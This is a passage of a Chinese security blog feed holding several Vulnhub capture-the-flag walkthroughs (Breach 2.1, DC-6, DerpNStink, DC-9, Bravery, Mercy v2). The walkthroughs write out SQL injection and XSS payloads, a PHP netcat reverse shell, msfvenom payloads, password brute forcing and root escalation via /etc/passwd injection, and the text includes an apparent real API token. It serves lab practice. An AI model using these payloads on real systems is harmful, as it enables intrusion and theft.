<p>尝试ssh连接，根据提示输入凭据peter/inthesource，80端口就会打开</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Breach-2-1/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>在blog目录的搜索出发现sql注入</p>
<p>确认漏洞的payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breach-2-1/3.png" alt="3"></p>
<p>或者延时注入确认漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; and sleep(5)#</span><br></pre></td></tr></table></figure>

<p>确认字段使用下面这个payload，这样布尔注入回显页面内容，order by错误页面不回显</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 order by 1#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breach-2-1/4.png" alt="4"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 order by 10#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breach-2-1/5.png" alt="5"></p>
<p>这样就可以确认字段数了，后面可以通过union注入带回显的方式，轻松攻击数据库</p>
<p>之后就可以发现一个重要的凭据</p>
<p><img src="/images/Breach-2-1/6.png" alt="6"></p>
<p>破解后是<code>admin/32admin</code></p>
<h3 id="存储型XSS到浏览器exp"><a href="#存储型XSS到浏览器exp" class="headerlink" title="存储型XSS到浏览器exp"></a>存储型XSS到浏览器exp</h3><p>在这之后搜索公开漏洞</p>
<p><img src="/images/Breach-2-1/7.png" alt="7"></p>
<p>发现一处存储型xss漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;xss&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breach-2-1/9.png" alt="9"></p>
<p>验证成功</p>
<p><img src="/images/Breach-2-1/8.png" alt="8"></p>
<p>之后插入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;192.168.110.128:3000&#x2F;hook.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>这里不用beef，不需要那么麻烦</p>
<p>先验证一下访问请求是否发出了</p>
<p><img src="/images/Breach-2-1/10.png" alt="10"></p>
<p>收到请求了，发现了对方的UA，根据UA发现了一个msf的漏洞利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">multi&#x2F;browser&#x2F;firefox_proto_crmfrequest</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breach-2-1/11.png" alt="11"></p>
<p>设置好msf的payload</p>
<p><img src="/images/Breach-2-1/12.png" alt="12"></p>
<p>现在修改hook.js，写入跳转</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">window.location.replace(&quot;http:&#x2F;&#x2F;192.168.110.128:8080&#x2F;evil&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/Breach-2-1/13.png" alt="13"></p>
<p>对方一旦访问</p>
<p><img src="/images/Breach-2-1/14.png" alt="14"></p>
<p>就成功的获取了shell，这个shell可能不稳定，执行一条命令就挂了<br>之后去查看.bashrc，可以找到无法ssh的原因</p>
<p><img src="/images/Breach-2-1/15.png" alt="15"></p>
<p>直接添加一个sh命令到.bashrc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;exec sh&quot; &gt; .bashrc</span><br></pre></td></tr></table></figure>

<p>这样就能够正常的ssh</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场DC 6</title>
    <url>/2020/09/19/%E9%9D%B6%E5%9C%BADC-6/</url>
    <content><![CDATA[<h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC 6"></a>DC 6</h1><p>kali:192.168.1.201<br>目标:192.168.1.203</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>添加hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wordy	192.168.1.203</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.203 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.203 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/DC-6/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80端口存在web应用wordpress</p>
<p>wpscan先扫描插件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token xxxx --url http:&#x2F;&#x2F;wordy&#x2F; -e ap --plugins-detection aggressive</span><br></pre></td></tr></table></figure>

<p>发现了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">akismet</span><br><span class="line">plainview activity monitor</span><br><span class="line">user role editor</span><br></pre></td></tr></table></figure>

<p>接着进行用户名枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token FgsbSSc5AS81Sr5jp3CpnwZ0Mp1dcimOMpqpQpLeDsc --url http:&#x2F;&#x2F;wordy&#x2F; -e u</span><br></pre></td></tr></table></figure>

<p>发现了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">jens</span><br><span class="line">graham</span><br><span class="line">mark</span><br><span class="line">sarah</span><br></pre></td></tr></table></figure>

<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>之后根据这些账户进行暴力破解，这个过程慢的让人骂娘，如果你使用了rockyou</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l mark -P rockyou.txt wordy -s 80 http-form-post &quot;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log+In&amp;redirect_to&#x3D;https%3A%2F%2F192.168.1.254%2Fwp-admin%2F&amp;testcookie&#x3D;1:login_error&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/DC-6/2.png" alt="2"></p>
<p>使用<code>mark/helpdesk01</code>进行登录</p>
<p>但是这里有点尴尬，我们虽然登录，但我们不是admin，所以很难反弹shell</p>
<p><img src="/images/DC-6/3.png" alt="3"></p>
<p>寻找插件的公开漏洞</p>
<p><img src="/images/DC-6/4.png" alt="4"></p>
<p>发现了<code>plainview activity monitor</code>存在命令注入</p>
<p>我们对它进行一些修改，主要是url地址和payload的使用</p>
<p><img src="/images/DC-6/5.png" alt="5"></p>
<p>之后我们就可以获得shell了</p>
<p><img src="/images/DC-6/6.png" alt="6"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在/etc/passwd中，发现这台机器有许多用户</p>
<p><img src="/images/DC-6/7.png" alt="7"></p>
<p>在home目录里发现了文件</p>
<p><img src="/images/DC-6/8.png" alt="8"></p>
<p>发现了用户凭证，直接切换过去</p>
<p>之后可以发现，该用户可以以jens执行某个shell文件</p>
<p><img src="/images/DC-6/9.png" alt="9"></p>
<p>发现我们对这个文件具有写权限</p>
<p><img src="/images/DC-6/10.png" alt="10"></p>
<p>直接写个/bin/bash过去，之后sudo执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#x2F;bin&#x2F;bash &gt;&gt; &#x2F;home&#x2F;jens&#x2F;backups.sh </span><br><span class="line">sudo -u jens &#x2F;home&#x2F;jens&#x2F;backups.sh</span><br></pre></td></tr></table></figure>

<p>这样我们就获得jens的shell</p>
<p>继续枚举，发现可以sudo执行nmap</p>
<p><img src="/images/DC-6/11.png" alt="11"></p>
<p>那提权就可以完成了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TF&#x3D;$(mktemp)</span><br><span class="line">echo &#39;os.execute(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; &gt; $TF</span><br><span class="line">sudo nmap --script&#x3D;$TF</span><br></pre></td></tr></table></figure>

<p><img src="/images/DC-6/12.png" alt="12"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场DerpNStink 1</title>
    <url>/2020/09/20/%E9%9D%B6%E5%9C%BADerpNStink-1/</url>
    <content><![CDATA[<p>kali:192.168.1.201<br>目标:192.168.1.206</p>
<p>添加host</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.1.206	derpnstink.local</span><br></pre></td></tr></table></figure>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.206 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.206 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/DerpNStink-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/DerpNStink-1/2.png" alt="2"></p>
<p>weblog发现wordpress</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>直接进行wps扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token FgsbSSc5AS81Sr5jp3CpnwZ0Mp1dcimOMpqpQpLeDsc --url http:&#x2F;&#x2F;derpnstink.local&#x2F;weblog&#x2F; -e ap --plugins-detection aggressive</span><br></pre></td></tr></table></figure>

<p>发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">akismet</span><br><span class="line">slideshow gallery</span><br></pre></td></tr></table></figure>

<p>并且发现了slideshow gallery的插件版本</p>
<p><img src="/images/DerpNStink-1/4.png" alt="4"></p>
<p>寻找公开漏洞</p>
<p><img src="/images/DerpNStink-1/5.png" alt="5"></p>
<p>尝试使用</p>
<p><img src="/images/DerpNStink-1/6.png" alt="6"></p>
<p>发现需要登录凭据，手动尝试到wp-admin登录，发现弱口令admin/admin</p>
<p><img src="/images/DerpNStink-1/3.png" alt="3"></p>
<p>登录进去后发现不能使用常规手段反弹shell，还是得需要文件上传</p>
<p><img src="/images/DerpNStink-1/6.png" alt="6"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python 34681.py -t http:&#x2F;&#x2F;derpnstink.local&#x2F;weblog -u admin -p admin -f shell.php</span><br></pre></td></tr></table></figure>

<p>这里有个坑，文件名不能包含<code>_</code>，比如<code>reverse_shell.php</code>死活不行，改个命就好了</p>
<p><img src="/images/DerpNStink-1/7.png" alt="7"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>内核脏牛提权失败</p>
<p>连接mysql</p>
<p><img src="/images/DerpNStink-1/8.png" alt="8"></p>
<p>发现账户</p>
<p><img src="/images/DerpNStink-1/9.png" alt="9"></p>
<p>破解哈希</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p>得到wedgie57</p>
<p><img src="/images/DerpNStink-1/10.png" alt="10"></p>
<p>尝试改密码切换其他用户</p>
<p><img src="/images/DerpNStink-1/11.png" alt="11"></p>
<p>切换成功，但是先别急，先去看看21端口有什么，可以使用这个凭证</p>
<p><img src="/images/DerpNStink-1/12.png" alt="12"></p>
<p>发现了文件</p>
<p><img src="/images/DerpNStink-1/13.png" alt="13"></p>
<p>是一个私钥，但测试后发现，还是stinky这个用户的<br>在home目录下的Documents发现了pcap包，传送到kali里分析<br>过滤http的post请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http.request.method&#x3D;&#x3D;POST</span><br></pre></td></tr></table></figure>

<p><img src="/images/DerpNStink-1/14.png" alt="14"></p>
<p>发现了mrderp的凭证，derpderpderpderpderpderpderp</p>
<p>枚举sudo权限</p>
<p><img src="/images/DerpNStink-1/15.png" alt="15"></p>
<p>发现可以执行任何命令，在/home/mrderp/binaries/目录，文件名必须以derpy为开头</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir binaries</span><br><span class="line">cd binaries&#x2F;</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; derpy.sh</span><br><span class="line">chmod +x derpy.sh</span><br><span class="line">sudo .&#x2F;derpy.sh </span><br></pre></td></tr></table></figure>

<p><img src="/images/DerpNStink-1/16.png" alt="16"></p>
<p>提权小心脏牛内核提权把系统给打崩了</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场DC-9</title>
    <url>/2020/05/23/%E9%9D%B6%E5%9C%BADC-9/</url>
    <content><![CDATA[<h1 id="DC-9"><a href="#DC-9" class="headerlink" title="DC-9"></a>DC-9</h1><p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.200</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/DC-9/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>ssh拒绝访问</p>
<p><img src="/images/DC-9/6.jpg" alt="6"></p>
<p><code>http://192.168.1.200/display.php</code>存在一些基础的用户信息<br><code>http://192.168.1.200/search.php</code>存在一个搜索框<br><code>http://192.168.1.200/manage.php</code>存在一个登录框</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>搜索框存在sql注入漏洞</p>
<p><img src="/images/DC-9/2.jpg" alt="2"></p>
<p>从sql注入漏洞中可以挖掘出的信息</p>
<p><img src="/images/DC-9/4.jpg" alt="4"></p>
<p><img src="/images/DC-9/3.jpg" alt="3"></p>
<p><img src="/images/DC-9/5.jpg" alt="5"></p>
<p>从中获取了admin的密码，并完成了破解为<code>transorbital1</code><br>顺利登录为admin，页面多出了Add Record功能，没什么用处<br>倒是页面底部<code>File does not exist</code>看起来像文件包含漏洞</p>
<p><img src="/images/DC-9/7.jpg" alt="7"></p>
<p>尝试文件包含，利用成功</p>
<p><img src="/images/DC-9/8.jpg" alt="8"></p>
<p>之前ssh无法建立连接，我们可以推测，目标机器上可能配置了<code>knockd.conf</code>，只有按顺序敲门才可以使用服务<br>网上找了一个knockd配置示例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[options]</span><br><span class="line">#UseSyslog</span><br><span class="line">LogFile &#x3D; &#x2F;knock.log                                  &#x2F;&#x2F;可以自定义日志的输出位置以及文件名</span><br><span class="line"></span><br><span class="line">[openSSH]</span><br><span class="line">sequence &#x3D; 7000,8000,9000                     &#x2F;&#x2F;定义顺序号，此处是默认的，也可以修改</span><br><span class="line">seq_timeout &#x3D; 30                                       &#x2F;&#x2F;设置超时时间太小的话可能会出错</span><br><span class="line">command &#x3D; &#x2F;sbin&#x2F;iptables -I INPUT -s 192.168.1.47 -p tcp --dport 22 -j ACCEPT      &#x2F;&#x2F;-i 命令是将规则插入到最前面，最先生效，以防止过滤所有端口的情况将此条规则吃掉</span><br><span class="line">tcpflags &#x3D; syn</span><br><span class="line"></span><br><span class="line">[closeSSH]</span><br><span class="line">sequence &#x3D; 9000,8000,7000                    &#x2F;&#x2F;定义关门顺序号,与开门对应，顺序相反</span><br><span class="line">seq_timeout &#x3D; 30 </span><br><span class="line">command &#x3D; &#x2F;sbin&#x2F;iptables -D INPUT -s 192.168.1.47 -p tcp --dport 22 -j ACCEPT    &#x2F;&#x2F;SSH使用完后，再将22端口“保护”起来</span><br><span class="line">tcpflags &#x3D; syn</span><br></pre></td></tr></table></figure>

<p>我们利用文件包含去尝试读取<code>/etc/knockd.conf</code></p>
<p><img src="/images/DC-9/9.jpg" alt="9"></p>
<p>得到了顺序<code>7469、8475、9842</code>，使用nc进行端口连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for x in 7469 8475 9842 ;do nc -nv 192.168.1.200 $x; done</span><br></pre></td></tr></table></figure>

<p><img src="/images/DC-9/10.jpg" alt="10"></p>
<p>此时ssh已经可以使用了</p>
<h3 id="爆破ssh"><a href="#爆破ssh" class="headerlink" title="爆破ssh"></a>爆破ssh</h3><p>我们尝试上面的枚举出用户名配合常用密码字典进行ssh爆破</p>
<p>用户名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.1.200&#x2F;results.php&quot; --data&#x3D;&quot;search&#x3D;1&quot; -D &quot;users&quot; -T &quot;UserDetails&quot; -C &quot;username&quot; --dump</span><br></pre></td></tr></table></figure>

<p><img src="/images/DC-9/11.jpg" alt="11"></p>
<p>成功爆破除了账户和密码</p>
<p>之后在使用用户<code>janitor</code>登录之后，找到了一个密码的文件</p>
<p><img src="/images/DC-9/12.jpg" alt="12"></p>
<p>把下列密码写入到密码字典，再次尝试爆破</p>
<p><img src="/images/DC-9/13.jpg" alt="13"></p>
<p>爆破出了joeyt的账号，尝试ssh连接</p>
<p>使用<code>sudo -l</code>看看能使用哪些root权限</p>
<p><img src="/images/DC-9/14.jpg" alt="14"></p>
<p>之后找到一个可以利用的py脚本</p>
<p><img src="/images/DC-9/15.jpg" alt="15"></p>
<p>它需要3个参数，并把第二参数写到第三个参数末尾<br>利用这点，我们可以构造一个root权限的用户，并添加到<code>/etc/passwd</code></p>
<p>使用openssl构造一个密码</p>
<p><img src="/images/DC-9/16.jpg" alt="16"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt 000 toor</span><br><span class="line">passwd -1	&#x2F;&#x2F;使用md5</span><br><span class="line">-salt 000	&#x2F;&#x2F;使用000作为盐</span><br><span class="line">toor就是我们使用的密码</span><br></pre></td></tr></table></figure>

<p>之后复制这段消息，构造我们的/etc/passwd信息，用户名为suser</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">suser:$1$000$WGcjZIfxKhymgsHNCg2FQ.:0:0::&#x2F;root:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>之后将这段消息写入到<code>/tmp</code>，执行程序进行提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;suser:$1$000$WGcjZIfxKhymgsHNCg2FQ.:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt; &#x2F;tmp&#x2F;a</span><br><span class="line">sudo .&#x2F;test &#x2F;tmp&#x2F;a &#x2F;etc&#x2F;passwd</span><br><span class="line">su suser			&#x2F;&#x2F;密码toor</span><br></pre></td></tr></table></figure>

<p><img src="/images/DC-9/17.jpg" alt="17"></p>
<p>提权成功</p>
<p>这靶场真的屑</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Digitalworld.local (Bravery)</title>
    <url>/2020/05/25/%E9%9D%B6%E5%9C%BADigitalworld-local-Bravery/</url>
    <content><![CDATA[<h1 id="Digitalworld-local-Bravery"><a href="#Digitalworld-local-Bravery" class="headerlink" title="Digitalworld.local(Bravery)"></a>Digitalworld.local(Bravery)</h1><p>Kali:192.168.1.3</p>
<p>靶场:192.168.1.253</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Bravery/1.jpg" alt="1"></p>
<p>通过扫描可以发现该站点拥有80、8080两个web服务、SMB服务、NFS共享(2049)、ssh</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>我是用<code>nikto</code>分别扫描了8080和80端口，从8080端口处发现了<code>robots.txt</code></p>
<p><img src="/images/Bravery/2.jpg" alt="2"></p>
<p><img src="/images/Bravery/3.jpg" alt="3"></p>
<p>dirb扫描了80和8080的web目录，发现了一个目录遍历</p>
<p><img src="/images/Bravery/4.jpg" alt="4"></p>
<p><img src="/images/Bravery/5.jpg" alt="5"></p>
<p>查看nfs可以挂载的共享信息，挂载之后查看文件</p>
<p><img src="/images/Bravery/6.jpg" alt="6"></p>
<p><img src="/images/Bravery/7.jpg" alt="7"></p>
<p>其中<code>qwertyuioplkjhgfdsazxcvb</code>看上去像一个密码</p>
<p>enum4linux枚举的smb信息</p>
<p><img src="/images/Bravery/9.jpg" alt="9"></p>
<p>查看无密码smb分享</p>
<p><img src="/images/Bravery/8.jpg" alt="8"></p>
<p>当我想查看secured这个目录时，发现它是有密码保护的<br>我使用枚举出的用户david和之前找到的密码，成功进入</p>
<p>可以使用smb命令提示符下载后查看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;root&#x2F;Desktop</span><br><span class="line">smbclient &#x2F;&#x2F;192.168.1.253&#x2F;secured -U David</span><br><span class="line">Enter WORKGROUP\david&#39;s password:: qwertyuioplkjhgfdsazxcvbnm</span><br><span class="line">get david.txt</span><br><span class="line">get genevieve.txt</span><br><span class="line">get README.txt</span><br></pre></td></tr></table></figure>

<p>或者<code>mount -o username=</code>挂载查看</p>
<p><img src="/images/Bravery/10.jpg" alt="10"></p>
<p>从中发现了两个有趣的网址</p>
<p><img src="/images/Bravery/11.jpg" alt="11"></p>
<p><code>192.168.1.253/devops/directortestpagev1.php</code>是一个404</p>
<p><code>192.168.1.253/genevieve</code>出现如下页面</p>
<p><img src="/images/Bravery/12.jpg" alt="12"></p>
<p>而且当我单机<code>Knowledge Management</code>，跳转到了<code>cuppaCMS</code></p>
<p><img src="/images/Bravery/13.jpg" alt="13"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="LFI-RFI"><a href="#LFI-RFI" class="headerlink" title="LFI/RFI"></a>LFI/RFI</h3><p>searsploit寻找漏洞</p>
<p><img src="/images/Bravery/14.jpg" alt="14"></p>
<p>LFI成功</p>
<p><img src="/images/Bravery/15.jpg" alt="15"></p>
<p>RFI成功</p>
<p><img src="/images/Bravery/16.jpg" alt="16"></p>
<h4 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h4><p>自己写入木马，侦听端口即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	print system(&quot;nc -nv 192.168.1.3 4444 -e &#x2F;bin&#x2F;bash&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>或者获取meterpreter会话都是不错的选择</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.3 LPORT&#x3D;8888 -f raw -o evil.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bravery/17.jpg"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>SUID提权</p>
<p>SUID权限的文件执行时，不会以当前用户权限执行，而会以文件拥有者的权限执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;				根目录</span><br><span class="line">-perm -u&#x3D;s		搜索SUID权限的文件</span><br><span class="line">-type f			普通文件</span><br><span class="line">2&gt;&#x2F;dev&#x2F;null		过滤错误信息	0——标准输入（stdin）		1——标准输出（stdout）		2——标准错误（stderr）</span><br></pre></td></tr></table></figure>

<p>过程可能会比较慢，耐心等待</p>
<p><img src="/images/Bravery/18.jpg" alt="18"></p>
<p>竟然找到了cp命令，我们可以利用它以root权限，替换各类敏感文件进行提权</p>
<p>我们可以打开受害者的<code>/etc/passwd</code>，添加用户提权</p>
<p><img src="/images/Bravery/19.jpg" alt="19"></p>
<p>创建账户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">suser:$1$000$WGcjZIfxKhymgsHNCg2FQ.:0:0::&#x2F;root:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>传输与替换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">wget http:&#x2F;&#x2F;192.168.1.3&#x2F;passwd</span><br><span class="line">cp passwd &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bravery/20.jpg" alt="20"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Digitalworld-local-MERCY v2</title>
    <url>/2020/05/26/%E9%9D%B6%E5%9C%BADigitalworld-local-MERCYv2/</url>
    <content><![CDATA[<h1 id="Digitalworld-local-Mercyv2"><a href="#Digitalworld-local-Mercyv2" class="headerlink" title="Digitalworld.local (Mercyv2)"></a>Digitalworld.local (Mercyv2)</h1><p>Kali:192.168.1.3</p>
<p>靶场:192.168.1.209</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Mercyv2/1.jpg" alt="1"></p>
<p>扫描出22、80处于filtered，开放了pop3，SMB，8080等服务</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>smb枚举</p>
<p><img src="/images/Mercyv2/2.jpg" alt="2"></p>
<p>Nmap进攻扫描已经扫出了一个目录<code>/tryharder/tryharder</code><br>得到一段密文，使用base64解码</p>
<p><img src="/images/Mercyv2/3.jpg" alt="3"></p>
<p>大意说有个人使用<code>password</code>作为密码</p>
<p>猜测该密码为smb密码，尝试连接，用户名为qiu</p>
<p><img src="/images/Mercyv2/4.jpg" alt="4"></p>
<p>连接后发现该目录下存在隐藏文件夹，搜寻后发现，HTTP和SSH配置了<code>knockd</code></p>
<p>按顺序敲门</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for x in 159 27391 4; do nc -nv 192.168.1.209 $x; done</span><br><span class="line">for x in 17301 28504 9999; do nmap -Pn -p $x 192.168.1.209; done</span><br></pre></td></tr></table></figure>

<p><img src="/images/Mercyv2/5.jpg" alt="5"></p>
<p>成功打开服务，这样我们就可以收集80端口上的信息了</p>
<p>dirb扫描80端口</p>
<p><img src="/images/Mercyv2/6.jpg" alt="6"></p>
<p>又扫描出了robots.txt</p>
<p><img src="/images/Mercyv2/7.jpg" alt="7"></p>
<p>提示我们两个路径</p>
<p><img src="/images/Mercyv2/8.jpg" alt="8"></p>
<p>在<code>nomercy</code>里发现了rips 0.53</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p><img src="/images/Mercyv2/10.jpg" alt="10"></p>
<p><img src="/images/Mercyv2/9.jpg" alt="9"></p>
<p>LFI利用成功</p>
<p>利用LFI，我们可以读取之前提示的tomcat用户信息</p>
<p><img src="/images/Mercyv2/11.jpg" alt="11"></p>
<p>成功发现账户和密码</p>
<p><img src="/images/Mercyv2/12.jpg" alt="12"></p>
<p>我们使用管理员账户和密码<code>thisisasuperduperlonguser/heartbreakisinevitable</code>登录管理界面</p>
<p><img src="/images/Mercyv2/13.jpg" alt="13"></p>
<h4 id="tomcat部署war-getshell"><a href="#tomcat部署war-getshell" class="headerlink" title="tomcat部署war getshell"></a>tomcat部署war getshell</h4><p>生成war包木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.1.3 LPORT&#x3D;4444 -f war -o evil.war</span><br></pre></td></tr></table></figure>

<p>点击即可getshell</p>
<p><img src="/images/Mercyv2/14.png" alt="14"></p>
<p>将shell提升为交互式shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<p>接着切换用户为fluffy，密码在tomcat管理文件里</p>
<p><img src="/images/Mercyv2/14.png" alt="14"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="cron-job"><a href="#cron-job" class="headerlink" title="cron job"></a>cron job</h3><p><img src="/images/Mercyv2/15.jpg" alt="15"></p>
